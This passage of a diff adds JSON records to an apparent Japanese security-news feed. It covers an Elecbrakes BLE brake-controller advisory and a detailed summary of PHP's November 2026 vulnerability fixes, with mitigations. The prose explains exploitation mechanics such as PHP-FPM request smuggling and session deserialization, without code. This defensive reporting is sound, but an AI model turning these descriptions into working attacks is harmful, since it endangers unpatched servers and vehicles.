+            "stage": "initial-access",
+            "detail": "通信範囲内のBLEデバイスが認証・ペアリングなしで接続"
+          },
+          {
+            "stage": "other",
+            "detail": "制御インターフェースへコマンドを書き込む"
+          },
+          {
+            "stage": "other",
+            "detail": "取得済みコマンドを再送し、最後のコマンドを持続"
+          },
+          {
+            "stage": "impact",
+            "detail": "ブレーキ、ライト、条件、安全機能を変更・無効化"
+          },
+          {
+            "stage": "impact",
+            "detail": "保護されていない更新経路でファームウェアを変更"
+          }
+        ],
+        "personal": [
+          "EB2はElecbrakesアプリを開き、firmware 3.0.4.4.3へ更新する",
+          "VM1はElecbrakesアプリを開き、firmware 1.3.4.2.1へ更新する",
+          "ELBC2000は修正版がないため、ベンダーの対策発表を確認する",
+          "更新完了を確認するまで、対象コントローラーでトレーラーを運行しない"
+        ],
+        "organization": [
+          {
+            "kind": "tech",
+            "action": "EB2を3.0.4.4.3、VM1を1.3.4.2.1へ更新し、BLE経由の制御侵入を止める"
+          },
+          {
+            "kind": "ops",
+            "action": "ELBC2000を資産台帳で特定し、修正版が出るまで利用停止または運行前確認を行う"
+          },
+          {
+            "kind": "tech",
+            "action": "制御系機器をインターネットから遮断し、業務ネットワークとはファイアウォールで分離する"
+          },
+          {
+            "kind": "tech",
+            "action": "遠隔アクセスが必要な場合は最新VPNを使い、接続端末側も更新する"
+          },
+          {
+            "kind": "ops",
+            "action": "BLE通信範囲への物理的な立ち入りを管理し、異常操作を検知したら社内手順で報告する"
+          }
+        ],
+        "relevance": [
+          "Elecbrakes EB2、VM1、ELBC2000を使っている人",
+          "オーストラリアまたはニュージーランドで対象機器を運用する企業",
+          "トレーラーのブレーキ制御を遠隔アクセスさせている組織"
+        ],
+        "unknowns": [
+          "CISAは特定の攻撃者や実際の被害事案を公表していない",
+          "これらの脆弱性を標的とした公開悪用は未確認",
+          "ELBC2000向けの修正方法と提供時期は未定"
+        ],
+        "whatsNew": null
+      }
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "piyolog",
+      "title": "11月に修正されたPHPの脆弱性についてまとめてみた",
+      "url": "https://piyolog.hatenadiary.jp/entry/2026/11/20/003148",
+      "publishedAt": "2026-11-19T15:31:48.000Z",
+      "tags": [
+        "脆弱性",
+        "テクノロジー",
+        "セキュリティ",
+        "security"
+      ],
+      "snippet": "2026年11月19日、PHPの開発元であるThe PHP Groupは4系統のセキュリティリリース(PHP 8.5.13、8.4.28、8.3.37、8.2.36)を公開し、複数の脆弱性を修正しました。ここでは関連する情報をまとめます。 どんな脆弱性が修正されたの? The PHP Groupは11月18日、19日14時から14時30分(協定世界時、日本時間23時から23時30分)にセキュリティリリースを行うと予告(出典: 2)。最高の深刻度の CRITICAL は「既定ではない設定または一般的ではないセットアップ」が条件と説明していた *1 。 国内ではIPAが19日に事前準備を呼びかけ、今回は10月の予告時と異なり「デフォルトではない設定、または、一般的ではないセットアップ」で影響するものと記載されていると伝えた(出典: 22)。国家サイバー統括室も同日18時37分、X で「前回とは…",
+      "body": "2026年11月19日、PHPの開発元であるThe PHP Groupは4系統のセキュリティリリース(PHP 8.5.13、8.4.28、8.3.37、8.2.36)を公開し、複数の脆弱性を修正しました。ここでは関連する情報をまとめます。\n\n \n どんな脆弱性が修正されたの?\n\n The PHP Groupは11月18日、19日14時から14時30分(協定世界時、日本時間23時から23時30分)にセキュリティリリースを行うと予告(出典: 2)。最高の深刻度の CRITICAL は「既定ではない設定または一般的ではないセットアップ」が条件と説明していた *1 。\n 国内ではIPAが19日に事前準備を呼びかけ、今回は10月の予告時と異なり「デフォルトではない設定、または、一般的ではないセットアップ」で影響するものと記載されていると伝えた(出典: 22)。国家サイバー統括室も同日18時37分、X で「前回とは異なり、本脆弱性の影響を受けるのは一部の環境に限定されるとのことです」と伝え、必要に応じて修正パッチを適用できるよう準備を求めた(出典: 23)。\n ChangeLog に記載された GHSA(GitHub Security Advisory)は 8.5.13 が17件、8.4.28 が14件、8.3.37 が13件、8.2.36 が12件(出典: 4)。17件の深刻度は Critical が7件、High が4件、Moderate が6件で、いずれも CVSS v4 による。このほか 8.5.13 では URI 拡張で使う uriparser を 1.0.3 に更新し、CVE-2026-48841 を修正した(出典: 4)。同じ19日に公開された PHP 8.6.0 の ChangeLog にも同じ17件の GHSA が記載されている(出典: 4)。\n\n \n \n GHSA \n CVE \n 深刻度 \n 対象機能 \n 主な前提 \n 影響する系統 \n \n\n \n GHSA-658j-r8rw-q6mx \n CVE-2026-115560 \n Critical(9.2) \n セッションの upload progress \n シリアライザーの異なる設定がセッション保存先を共有 \n 8.2〜8.5 \n \n\n \n GHSA-fm2m-fjf5-v3cp \n CVE-2026-126714 \n Critical(9.2) \n セッションの files ハンドラー \n セッションの内容に影響を与え、files ハンドラー(既定)の書き込みを中断させる \n 8.2〜8.5 \n \n\n \n GHSA-g3vh-838c-65v7 \n CVE-2026-129481 \n Critical(9.2) \n セッションの終了処理 \n 終了処理のコールバックで致命的エラーを起こせる \n 8.3〜8.5 \n \n\n \n GHSA-2fjv-p558-g82m \n CVE-2026-129182 \n Critical(9.2) \n 致命的エラーのバックトレース \n パス別設定で max_memory_limit か zlib の設定を上書きし、後続のリクエストで初期化前の診断が出る \n 8.5 \n \n\n \n GHSA-8mjj-2r7p-4hg2 \n CVE-2026-129474 \n Critical(9.2) \n マジックメソッドのバックトレース \n 8.5 で zend.exception_ignore_args=0 \n 8.5 \n \n\n \n GHSA-gr4f-wgx5-jpfv \n CVE-2026-129496 \n Critical(9.2) \n 日付拡張のタイムゾーンキャッシュ \n 起動時の診断を PHP のファイルベースの error_log に書く \n 8.2〜8.5 \n \n\n \n GHSA-qc49-hpvq-g2w6 \n CVE-2026-129289 \n Critical(9.2) \n PHP-FPM の php://input \n フロントエンドが FPM への接続を再利用し、php://input を読み切らない経路がある \n 8.2〜8.5 \n \n\n \n GHSA-jm4m-qfqx-967m \n CVE-2026-129291 \n High(8.8) \n PHP-FPM の catch_workers_output \n FPM ワーカーで PHP コードを実行でき、catch_workers_output 有効(公式 Docker イメージは有効) \n 8.2.7以降 \n \n\n \n GHSA-mmf9-xm3v-hg2x \n CVE-2026-127960 \n High(8.7) \n HTTP ストリームラッパーの応答ヘッダー \n 攻撃者がアプリの取得する HTTP 応答を制御できる \n 8.2.28以降、8.3.18以降、8.4.5以降、8.5 \n \n\n \n GHSA-f6gg-rchx-xw8j \n CVE-2026-128064 \n High(8.2) \n HTTP と FTP のストリームラッパー \n 大文字の S を含むスキームの通信を攻撃者が観測できる \n 8.2〜8.5 \n \n\n \n GHSA-68fq-fh7h-f8gr \n CVE-2026-128090 \n High(7.7) \n Phar の OpenSSL 署名 \n Phar は変更できるが公開鍵は変更できない \n 8.2〜8.5 \n \n\n \n GHSA-5j3f-64r7-f564 \n CVE-2026-129538 \n Moderate(6.9) \n php-cgi の PATH_INFO 補正 \n cgi.fix_pathinfo=1 で整合しない PATH_INFO を渡すマッピング \n 8.2〜8.5 \n \n\n \n GHSA-x8r7-mg3g-74hg \n CVE-2026-129501 \n Moderate(6.3) \n DOM の XML シリアライズ \n 新しい DOM API で信頼できない文書を saveXml() \n 8.4〜8.5 \n \n\n \n GHSA-q23r-hr55-xmpg \n CVE-2026-15353 \n Moderate(6.3) \n SOAP の配列のデコード \n 不正な arraySize の SOAP を受け付け、配列を返す \n 8.2〜8.5 \n \n\n \n GHSA-4646-p932-gw34 \n CVE-2026-129506 \n Moderate(6.3) \n SOAP の DTD 処理 \n 攻撃者が制御する SOAP の XML、WSDL、スキーマを処理する \n 8.2〜8.5 \n \n\n \n GHSA-mg3p-mxj9-g2mm \n CVE-2026-129438 \n Moderate(6.3) \n RFC 3986 URI の文字列化 \n 攻撃者が制御する約2 GiB の URI データを文字列化 \n 8.5 \n \n\n \n GHSA-3mg3-cr28-46gc \n CVE-2026-129292 \n Moderate(5.3) \n PHP-FPM のステータスページ \n ステータスを有効にし full の HTML で表示 \n 8.2〜8.5 \n \n\n \n \n 表の記載は各 GHSA による(出典: 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21)。\n\n 影響する系統はいずれも各系統の修正版(8.2.36、8.3.37、8.4.28、8.5.13)より前の版(出典: 5〜21)。\n\n 17件のうち7件の GHSA に「This report was submitted with AI assistance」の記載がある。対象は CVE-2026-129538、CVE-2026-129496、CVE-2026-129289、CVE-2026-129506、CVE-2026-129474、CVE-2026-129481、CVE-2026-129291 の7件(出典: 7, 9, 10, 11, 12, 16, 19)。\n\n \n 10月のリリースとつながる項目は?\n\n 10月に公表された PHP の2件の脆弱性(CVE-2026-109618、CVE-2026-109619)は PHP2Shell とも呼ばれる(出典: 22)。\n piyolog.hatenadiary.jp \n 今回の17件のうち、10月の修正や告知とつながるのは次の4件。\n\n \n CVE-2026-129481(Critical)\n\n GHSA は CVE-2026-109619 の不完全な修正と明記している。PHP 8.3 以降が対象(8.2 には該当するフィールドがない)で、セッションの終了処理中に呼ばれるコールバック(ユーザー定義ストリームラッパーの stream_close() など)で致命的エラーを起こせる経路があるセッション利用アプリが関係する。10月の GHSA にあった診断を生む FastCGI パラメーターや upload progress は要らない(出典: 7)。\n 終了処理が致命的エラーで中断すると、セッション開始時に記録した実行スクリプトのファイル名が解放も消去もされないままヒープだけが解放され、同じワーカーの次のリクエスト(別の利用者のものでもよい)で古い文字列を解放しうる。得られるのはメモリ破壊とワーカーのクラッシュで、コード実行の可能性はあるがこの経路での実証はない。再現は OPcache を無効にした構成で、ファイル名が OPcache の永続メモリにある場合は同じ状態にならないが、キャッシュされずに実行されうるスクリプトがあるため OPcache を有効にするだけでは確実な緩和策にならない。回避策は終了処理のコールバックでの致命的エラーを避けること(出典: 7)。\n\n \n CVE-2026-129182(Critical)\n\n PHP 8.5 のみが対象。8.5.12 が CVE-2026-109619 の対策でバックトレース(last_fatal_error_backtrace)の解放後使用を防いだ後、終了処理中の致命的エラーがそのグローバルを再び作る経路が見つかった。成立には max_memory_limit を全体とパス別の両方で指定し、メモリ消費がなお全体の上限を超えて復元が失敗する場合(管理者側の設定のみ)か、全体で zlib.output_compression=1、パス別で 0 と output_handler を指定する場合に加え、同じワーカーの後続のリクエストで実行環境の初期化前に診断が出ることが要る。zlib の設定は .user.ini でも変えられるが、初期化前の診断は通常の FPM プール設定や .user.ini では出ない。Apache のディレクトリ別設定で起こせるほか、FPM ではフロントエンドが診断を生む PHP_VALUE や PHP_ADMIN_VALUE の FastCGI パラメーターを送る場合に該当する(出典: 8)。\n 初期化前の診断が出ると、再び作られたグローバルの解放済みの領域を使いうる。実証されたのは解放後使用とワーカーのクラッシュで、この入口でのリモートコード実行は実証されておらず、GHSA は CVE-2026-109619 と同様に可能性はあるとしている。回避策は fatal_error_backtraces=0 を管理者側で設定してすべてのワーカーを再起動すること(出典: 8)。\n\n \n CVE-2026-129474(Critical)\n\n PHP 8.5 のみが対象。致命的エラーのバックトレース(8.5 で既定で有効)を使い、zend.exception_ignore_args=0(組み込みの既定値)の環境で、__call() や __callStatic() に届く経路があるアプリが関係する。php.ini-production は zend.exception_ignore_args=1 にしており、この攻撃経路を防ぐ(出典: 9)。\n 8.5.12 で入ったメモリ確保失敗の遅延処理により、マジックメソッドへ入る間に致命的エラーが報告されると、バックトレースが以前の呼び出しの残りの値を集めることがあり、その一部が解放済みのメモリを指しうる。再利用されたメモリ内のリクエストのバイトを生きた値として扱い、メモリ破壊や制御の移転が起こりうる。実証された攻撃は細工した JSON をインポート用のエンドポイントに送り、ログ引数の構築が memory_limit を超えるようリクエストの大きさを調整するもの。PHP 8.5 でワーカーの権限でのコード実行を確認している。実証された連鎖では使えるメモリアドレスの把握も要る。関係しうる経路として Laravel のファサードや Magento のゲスト向け送料見積もりが挙がっているが、完全な導入環境での悪用は実証されていない(出典: 9)。\n 回避策は zend.exception_ignore_args=1 を設定しての再起動、または 8.5 では fatal_error_backtraces=0(出典: 9)。\n\n \n CVE-2026-115560(Critical)\n\n 10月23日の告知はこの CVE を起こりにくいとしつつ、リモートコード実行につながりうる経路として挙げ、次回の定期リリースまで session.upload_progress.enabled=0 を勧めていた。条件は session.serialize_handler を設定で php_binary か php_serialize にしたうえ、実行時に ini_set() で php に切り替えて session_start() を呼ぶアプリで、かつ upload progress が有効な場合(出典: 1)。\n 11月19日の GHSA は条件を広く示し、「実行時の設定変更は要件ではない」と明記している。INI の固定設定が異なる別のアプリ、プール、バーチャルホスト、CLI のプロセスでも、同じセッション保存先を共有して互換性のないデータを書けば影響を受けうる。files ハンドラーでは同じ保存ディレクトリ、同じセッション ID、双方がファイルにアクセスできる権限が要件で、別の FPM プールでも保存先は自動では分かれない。GHSA はこの件を CVE-2026-109619 の古い状態の残存とは別の、設定依存のデシリアライズ問題としている(出典: 5)。\n upload progress が有効な文脈のマルチパートのアップロードで、PHP は送られた PHP_SESSION_UPLOAD_PROGRESS の値をセッションキーに付けて保存する。php_binary や php_serialize で書かれたものを php 形式で読むと、攻撃者が入れた区切り文字によりキー内のバイトが unserialize に渡り、デコーダーがレコードを拒否する前にオブジェクトが生成されてデシリアライズや破棄のコールバックが呼ばれうる。コード実行には読み取り側に使えるガジェットチェーンが要る。得られるのはワーカーの権限でのコード実行、ファイルの改変、セッションの破損、サービス拒否。報告者は PHP 8.2.35、8.3.36、8.4.27、8.5.12 でコマンド実行を再現した(出典: 5)。\n 修正は既定を無効に変え、有効なときは実行時のセッション設定の変更を拒否する。回避策はその保存先に書き込みうるすべての設定で、管理者側で session.upload_progress.enabled=0 を設定すること(リクエストの入力を処理する前に設定する必要があり、アプリの ini_set() では遅い)。明示的に有効にした設定は修正後も新しい既定より優先され、その場合は読み書きするすべての側でシリアライザーを揃える必要がある(出典: 5)。\n\n CVE-2026-115560 の影響が生じる構成 \n\n \n セッションファイルとタイムゾーンキャッシュの2件は?\n\n \n \n CVE-2026-126714(Critical)\n\n セッションの files 保存ハンドラー(PHP の既定)が対象で、upload progress に限らない。セッションに大きな利用者入力を保存するアプリも関係する。成立には攻撃者がセッションの内容に影響を与えられること、書き込みを有用な位置で中断できること、アプリに使えるガジェットチェーンがあることが要る(出典: 6)。\n ps_files_write() が既存ファイルの中身を消さずに新しいデータを書くため、書き込みが途中で止まると新旧のセッションが混ざったファイルが残りうる。スレッド版の PHP では、別スレッドのメモリ上限の失敗でプロセスが終わることで、書き込みの止まる位置に影響を与えうる。新旧のデータの配置次第で、以前は普通の文字列だった部分がシリアライズされたオブジェクトのデータとして読まれ、次の session_start() などでデシリアライズの動作が呼ばれうる。得られるのはワーカーの権限でのコード実行とセッションの破損。回避策は不要なら upload progress を管理者側で無効にする(攻撃者のデータを入れる経路の一つを塞ぐもので、アプリが独自に攻撃者のデータをセッションに保存する場合の問題は解消しない)、セッションに保存する信頼できないデータの量を制限する、レコードを原子的に置き換える保存先を使うこと(出典: 6)。\n\n \n CVE-2026-129496(Critical)\n\n 日付拡張のタイムゾーンキャッシュが対象。非スレッドセーフのビルドで、PHP-FPM と Apache の mod_php ではワーカーが親から古い参照を引き継ぎうる(CGI でも再現)。起動時の診断(不正な date.timezone の値、セッション設定による警告や非推奨など)を PHP のファイルベースの error_log 経路に書く環境が関係し、FPM 自身のエラーログだけでは条件を満たさない(出典: 10)。\n 起動中の診断で確保されたタイムゾーンキャッシュは起動の終了で解放された後も内部の参照が残る。日付拡張が最初のリクエストを初期化するまでの間に max_input_vars 超過の警告のような早期の診断が出ると、解放済みのハッシュテーブルを読み書きしうる。そこに攻撃者の制御するリクエストのデータが入っていることがあり、認証なしで到達しうる(出典: 10)。\n FPM ワーカーのクラッシュは max_input_vars の既定値と通常の nginx のヘッダー制限で実証され、FPM と mod_php では既知のアドレスと追加の設定の前提のもとで、ローカルでコマンド実行を実証している。FPM での実証には特定の設定とヒープ配置が要るが、GHSA はこれを実証した攻撃の条件で欠陥の一般要件ではないとしている。リモートからの ASLR(アドレス空間配置のランダム化)の回避はありうるとしているが、単独で完結する回避は実証されていない(出典: 10)。 *2 \n 回避策は起動時の診断を生む設定の誤りや非推奨設定を直し、PHP のマスターと全ワーカーを再起動すること(出典: 10)。\n\n \n PHP-FPM と php-cgi の4件は?\n\n \n \n CVE-2026-129289(Critical)\n\n フロントエンドが PHP-FPM への接続を再利用している構成で、php://input を開いて最後まで読まない経路があるアプリが関係する(ルーティングや認証の前に入力ストリームを作るフレームワークなど)。接続の再利用は nginx の fastcgi_keep_conn on、Apache mod_proxy_fcgi の enablereuse=on、接続を保持する HAProxy の FastCGI アプリケーションが該当し、LSAPI の持続接続も該当する。標準の nginx や Apache の設定はリクエストごとに接続を閉じるため、実証された PHP-FPM への攻撃の対象外(出典: 11)。\n 攻撃者は PHP の multipart パーサーが予測できる位置で止まるよう細工した multipart/form-data の本文を持つ HTTP リクエストを1回送る。アプリが php://input を開いて最後まで読まずに終わると、終了処理は入力ストリームがあることを本文の処理済みと誤って扱って読み残しの破棄を飛ばし、本文のバイトが残る。接続を維持した PHP-FPM は まだ FCGI_STDIN レコードの内側にいることを把握しなくなっており、本文内の適切な位置に置かれた FastCGI メッセージを新しいリクエストとして受理する。偽のリクエストで SCRIPT_FILENAME、REMOTE_ADDR、PHP_ADMIN_VALUE を指定でき、既存の PHP スクリプトのパスが分かれば、リクエスト本文自身を PHP として実行させる設定を入れられる。得られるのはワーカーの権限でのコード実行、フロントエンドが公開していないスクリプトの実行、偽の送信元アドレスの供給、後続のリクエストでの管理者設定の変更(出典: 11)。\n GHSA は PHP-FPM では他の利用者の操作や既定ではない PHP の設定なしにコードを実行でき、メモリ破壊や競合も要さないとしている。LSAPI では後続のリクエストの妨害が起こるが、GHSA は任意のコード実行を確認していない。回避策はフロントエンドのバックエンド接続の再利用を無効にすること(出典: 11)。\n\n CVE-2026-129289 の攻撃の流れ \n\n \n CVE-2026-129291(High)\n\n PHP-FPM の catch_workers_output を有効にしたプールが対象(既定は no、公式の Docker イメージは有効)。FPM のワーカーで PHP コードを実行できる攻撃者が前提で、epoll のイベントバックエンドを使い、メモリ配置とタイミングにも依存する(出典: 12)。\n ワーカー終了時の後始末の遅れを突き、止めた兄弟プロセスに元のパイプと epoll の記述子を保持させて監視を残す。遅延した後始末が再利用された記述子番号を使い、元の監視を外せないまま記録を解放した後に古いパイプへ書き込むと、マスターが解放済みの記録のコールバックを呼ぶ。実証では FPM マスターの権限(多くは root)でコマンドを実行した。マスターが root でなければその利用者の権限にとどまる。コンテナで得られるのはマスターのコンテナ内の権限で、それだけではコンテナからの脱出にはならない。回避策は catch_workers_output の無効化(出典: 12)。\n\n \n CVE-2026-129538(Moderate)\n\n php-cgi(CGI と FastCGI の両モード)が対象で、PHP-FPM と Apache モジュールとしての PHP は対象外。cgi.fix_pathinfo=1(既定)で、Web サーバーが整合しない SCRIPT_FILENAME(リダイレクトされた CGI の要求では PATH_TRANSLATED)と PATH_INFO を渡す特定のマッピングのときに成立し、CGI、FastCGI、URL の書き換えのどれか単独では足りない。公開された php-cgi の FastCGI リスナーには直接送れる(出典: 16)。\n 取り除いた末尾のサフィックスの長さを渡された PATH_INFO の末尾から引いて置換後の PATH_INFO を計算するため、サフィックスの方が長いとポインタが PATH_INFO のバッファより手前になり、その後のパス補正で読み取り、書き込み、コピーが起こる。認証なしの攻撃者によるクラッシュ、プロセスメモリの露出、メモリ破壊が起こりうる。コード実行は主張されているが、確認されていない。回避策は php-cgi の設定で cgi.fix_pathinfo=0 にし、アプリのルーティングが動くことを確かめること(出典: 16)。\n このほか CVE-2026-129292 は PHP-FPM のステータスエンドポイントを有効にし、運用者やツールが full のステータスを HTML で表示する環境が対象で、攻撃者にステータスエンドポイントへのアクセス権は要らない。Basic 認証ヘッダーのユーザー名などに仕込まれた内容が別の利用者の閲覧時にステータスページのオリジンで JavaScript として実行される XSS で、ユーザー名を使う経路では、フロントエンドがそのヘッダーを FPM へ転送することが条件になる。回避策はステータスエンドポイントの無効化か full の HTML 出力を使わないこと(出典: 20)。\n\n \n 外部と通信する処理の2件は?\n\n file_get_contents() や fopen() など、HTTP や FTP のストリームラッパーで外部の URL を取得するアプリが関係する。\n\n \n CVE-2026-128064(High)\n\n 大文字の S を含むスキーム(HTTPS://、httpS://、FTPS:// など。リダイレクト先を含む)の URL がストリーム関数に届き、その通信を攻撃者が観測できる場合が対象になる(出典: 13)。\n ストリームラッパーはスキームを大文字小文字を区別せずに認識するが、TLS を有効にする判定は固定位置の小文字の s で行うため、アプリの検証を通った大文字の URL が暗号化なしの HTTP や FTP で通信する。307 リダイレクトで有効な HTTPS 接続から大文字の HTTPS:// の URL へ飛ばされると、保持された POST の本文と認証ヘッダーが平文で送られ、送信先が平文の接続を拒否しても漏れうる。漏れうるのは認証情報、ベアラートークン、Cookie、機微な POST データ、FTP のログイン情報、ファイルの内容。回避策は HTTPS と FTPS のスキームを小文字に正規化してからストリーム関数へ渡すことで、リダイレクトを許す場合は自動追従を止め、各リダイレクト先を検証して正規化する(最初の URL の正規化だけでは防げない)(出典: 13)。\n このほか CVE-2026-127960 は HTTP と HTTPS のストリームラッパーが折り返された応答ヘッダーを処理する際に、攻撃者がアプリの取得する HTTP 応答を制御できる場合が対象。短い継続行を多数含む応答で過剰な CPU 消費のサービス拒否を起こしうるが、機密性や完全性への影響は観測されておらず、allow_url_fopen を有効にしているだけではリモートからの攻撃は成立しない。回避策はリダイレクト先を含め、外向きのリクエストの宛先を信頼できる先に制限すること(出典: 14)。\n\n \n 文書やデータ形式を扱う処理の5件は?\n\n DOM、SOAP、Phar、URI のそれぞれを使うアプリが関係する。\n\n \n CVE-2026-128090(High)\n\n OpenSSL 署名つきの Phar に依存し、公開鍵(` .pubkey`)を信頼できる経路で置いているアプリが対象。攻撃者が Phar を変更または置換できるが、その公開鍵は変更できない場合に成立し、公開鍵も除去や置換ができる攻撃者は元から自分の鍵で署名できるため修正の対象外(出典: 15)。\n 署名の種別はアーカイブ自身が指定し、検証側がそれを権威あるものとして使うため、攻撃者は内容と署名を置換して誰でも再計算できる SHA-256 などのダイジェストの種別を選ぶと、秘密鍵なしに phar.require_hash=1 を満たす。改変された Phar を読み込むと、そのプロセスの権限で攻撃者の PHP コードが実行されうる。対策は修正版への更新。そのうえで公開鍵を認証された経路で入手し、削除や置換できない権限で配置する(出典: 15)。\n このほか次の4件は主にサービス拒否や限定的な情報の露出、誤った URI の返却で、いずれもコード実行は確認されていない。\n CVE-2026-129501 は新しい DOM API(Dom\\XMLDocument、Dom\\HTMLDocument。8.4 以降が対象)…",
+      "metrics": {
+        "hatena": 10
+      },
+      "sourceWeight": 5,
+      "feedCategory": "security",
+      "id": "d281d28344f11051",
+      "lang": "ja",
+      "foundIn": [
+        "hatena",
+        "rss"
+      ],
+      "preScore": 0.9366666666666668,
+      "popularityPercentile": 1,
+      "matchedTopics": [
+        "セキュアな開発"
+      ],
+      "buzz": true,
+      "score": 78,
+      "titleJa": null,
+      "oneLiner": "PHPが4系列の更新版を公開し18件の脆弱性を修正した。",
+      "takeaways": [
+        "PHPが4系列の安全な更新版を公開した。",
+        "修正対象には深刻度が最も高い欠陥が7件あった。",
+        "影響が限られる設定でも事前準備が呼びかけられた。"
+      ],
+      "keywords": [
+        "PHP",
+        "PHP 8.5.13",
+        "PHP 8.4.28",
+        "PHP 8.3.37",
+        "PHP 8.2.36",
+        "CVE-2026-488"
+      ],
+      "category": "リリース/アップデート",
+      "lane": "security",
+      "incident": null,
+      "readingMinutes": 8,
+      "payoff": "apply",
+      "durability": "durable",
+      "imageUrl": "https://ogimage.blog.st-hatena.com/10257846132616586766/14729835035341052855/1795105543",
+      "rank": 3,
+      "deep": {
+        "summary": "The PHP Groupは2026年11月19日、PHP 8.5.13、8.4.28、8.3.37、8.2.36を公開し、17件のGHSAとCVE-2026-48841を修正した。Criticalは7件あり、セッション保存、PHP-FPM、致命的エラーのバックトレース、タイムゾーンキャッシュなど、設定や構成に依存するものが中心である。特にCVE-2026-129289は、フロントエンドがPHP-FPM接続を再利用し、php://inputを読み切らない経路があると、残った本文をFastCGIメッセージとして受理させ、ワーカー権限でコード実行できる。CVE-2026-115560はセッション保存先を異なるシリアライザーで共有する構成、CVE-2026-128064は大文字のSを含むURLスキームを外部通信に使う構成が対象となる。PHP 8.5利用者は今回の更新に加え、fatal_error_backtraces、zend.exception_ignore_args、session.upload_progress.enabledなどの設定を確認する必要がある。",
+        "prerequisites": [
+          {
+            "term": "GHSA",
+            "stumblingPoint": "「ChangeLogに記載されたGHSAは8.5.13が17件」とあるが、CVEとの関係が読み取りにくい。",
+            "explanation": "GHSAはGitHub Security Advisoryの識別子で、脆弱性の説明・影響条件・修正版情報をまとめた勧告である。CVEは脆弱性を識別する別の番号で、今回の表では1件のGHSAに対応するCVEが併記されている。修正対象を漏れなく確認するには、PHPのChangeLogだけでなく各GHSAの前提条件も見る必要がある。"
+          },
+          {
+            "term": "セッション保存先",
+            "stumblingPoint": "「異なる設定がセッション保存先を共有」とあるが、別のFPMプールでもなぜ影響するか分かりにくい。",
+            "explanation": "セッション保存先は、PHPがセッションデータを書き込むファイルやディレクトリなどである。別のアプリ、FPMプール、バーチャルホスト、CLIプロセスでも同じ保存先を使えば、異なるシリアライザーで書いたデータを別の設定のPHPが読むことになる。設定単位では分離されず、実際の保存パスとアクセス権の共有が境界になる。"
+          },
+          {
+            "term": "シリアライザー",
+            "stumblingPoint": "「php_binaryやphp_serializeで書かれたものをphp形式で読む」とあるが、何が危険なのか読み取れない。",
+            "explanation": "シリアライザーは、PHPの値やオブジェクトを保存可能なバイト列へ変換し、後で復元する仕組みである。形式の異なるデータを別の形式として読むと、入力の一部がオブジェクトとして解釈され、デシリアライズ時の処理や破棄処理が呼ばれうる。攻撃コードの実行にはアプリ側のガジェットチェーンも必要だが、保存先を共有するだけで境界を越えて異なる形式が読まれる点が問題になる。"
+          },
+          {
+            "term": "PHP-FPM",
+            "stumblingPoint": "「接続を再利用したPHP-FPMはまだFCGI_STDINレコードの内側」とあり、通常のHTTP処理との境界が分かりにくい。",
+            "explanation": "PHP-FPMはWebサーバーからFastCGIメッセージを受け取り、PHPワーカーで処理する実行基盤である。フロントエンドが接続を再利用する場合、前のHTTPリクエスト本文をPHP側が読み切らないと、本文の残りが同じ接続に残る。CVE-2026-129289では、その残りに細工したFastCGIメッセージを混ぜ、次のリクエストとしてPHP-FPMに解釈させる。"
+          },
+          {
+            "term": "catch_workers_output",
+            "stumblingPoint": "「公式のDockerイメージは有効」とあるが、PHP-FPMの通常設定との違いが分からない。",
+            "explanation": "catch_workers_outputは、FPMワーカーの標準出力・標準エラーを捕捉してFPM側のログへ流す設定である。既定値はnoだが、公式のDockerイメージでは有効になっている。CVE-2026-129291は、すでにワーカーでPHPコードを実行できる攻撃者が、この設定とepoll、プロセス終了処理の条件を利用してFPMマスター側の処理へ到達する問題である。"
+          },
+          {
+            "term": "fatal_error_backtraces",
+            "stumblingPoint": "「fatal_error_backtraces=0を管理者側で設定」とあるが、アプリのini_set()では不十分な理由が必要になる。",
+            "explanation": "fatal_error_backtracesは、致命的エラー時に呼び出し履歴を記録する機能の設定である。今回の一部の問題は、リクエストやパス別設定を処理する過程より前後の内部状態を悪用するため、アプリケーションが実行時に設定を変えるのでは間に合わない。PHP管理者側の設定として無効化し、全ワーカーを再起動して古い内部状態を破棄する必要がある。"
+          },
+          {
+            "term": "php://input",
+            "stumblingPoint": "「php://inputを開いて最後まで読まない経路」とあるが、入力を読む処理が攻撃条件になる理由が分かりにくい。",
+            "explanation": "php://inputは、HTTPリクエスト本文をPHPから読み取るためのストリームである。アプリがこのストリームを開いた後に本文を最後まで消費せず終了すると、PHP-FPM側が本文を処理済みと誤認し、接続再利用時に残ったバイトを次のFastCGIメッセージとして扱う可能性がある。認証やルーティングより前に入力ストリームを作るフレームワークでは、攻撃経路になりうる。"
+          },
+          {
+            "term": "ストリームラッパー",
+            "stumblingPoint": "「HTTPS://でもTLSを有効にする判定は小文字のs」とあるが、URLの検証を通過して漏洩する仕組みが分からない。",
+            "explanation": "ストリームラッパーは、file_get_contents()やfopen()などからHTTP・HTTPS・FTP・FTPSのURLを扱うPHPの入出力機能である。今回の問題ではスキームの認識自体は大文字小文字を無視する一方、TLS利用判定が固定位置の小文字sに依存する。そのためアプリの検証を通ったHTTPS://やhttpS://が暗号化なしで送信され、リダイレクト先ではPOST本文や認証ヘッダーも漏れうる。"
+          }
+        ],
+        "visual": null,
+        "figures": [
+          {
+            "url": "https://cdn-ak.f.st-hatena.com/images/fotolife/p/piyokango/20261120/20261120004947.png",
+            "alt": "CVE-2026-129289 の攻撃の流れ",
+            "caption": "細工したmultipart/form-dataの本文が読み残され、接続再利用されたPHP-FPMでFastCGIメッセージとして解釈され、偽の設定を伴うPHP実行に至る流れを確認できる。"
+          }
+        ],
+        "code": {
+          "lang": "php.ini",
+          "caption": "記事に記載された回避設定の最小例。PHP管理者側で設定し、変更後はPHP-FPMの全ワーカーを再起動する。",
+          "content": "session.upload_progress.enabled=0\nfatal_error_backtraces=0\nzend.exception_ignore_args=1\ncgi.fix_pathinfo=0"
+        },
+        "relatedLinks": [],
+        "readingMinutes": 8,
+        "lane": "security",
+        "whatHappened": [
+          "2026-11-19 PHP 8.5.13など4系統が公開され17件のGHSAを修正",
+          "Critical 7件、High 4件、Moderate 6件をPHP 8.2〜8.5で修正",
+          "PHP-FPM、セッション、HTTP/FTP通信、DOM・SOAPなどに影響"
+        ],
+        "attackChain": [
+          {
+            "stage": "initial-access",
+            "detail": "細工したmultipart/form-dataやPHP-FPM接続再利用を利用して入力を到達させる"
+          },
+          {
+            "stage": "other",
+            "detail": "php://inputの読み残しや偽のFastCGIメッセージを同一接続へ残す"
+          },
+          {
+            "stage": "impact",
